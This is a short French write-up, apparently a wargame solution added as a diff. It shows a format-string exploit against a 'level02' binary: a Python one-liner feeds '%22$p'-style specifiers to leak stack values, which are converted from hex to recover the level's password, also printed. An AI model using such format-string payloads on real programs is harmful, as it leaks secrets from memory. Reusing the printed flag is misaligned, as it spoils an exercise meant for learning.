@@ -1,0 +1,24 @@
+python -c "print '%22\$p.%23\$p.%24\$p.%25\$p.%26\$p' + '\n' + 'a' + '\n'" | /home/users/level02/level02
+
+Ca nous donne :
+
+0x756e505234376848.0x45414a3561733951.0x377a7143574e6758.0x354a35686e475873.0x48336750664b394d
+
+On convertit les chaines en big endian
+
+4868373452506e75
+51397361354a4145
+58674e5743717a37
+7358476e68354a35
+4d394b6650673348
+
+On a donc :
+Hh74RPnu
+Q9sa5JAE
+XgNWCqz7
+sXGnh5J5
+M9KfPg3H
+
+
+Donc en concatenant :
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
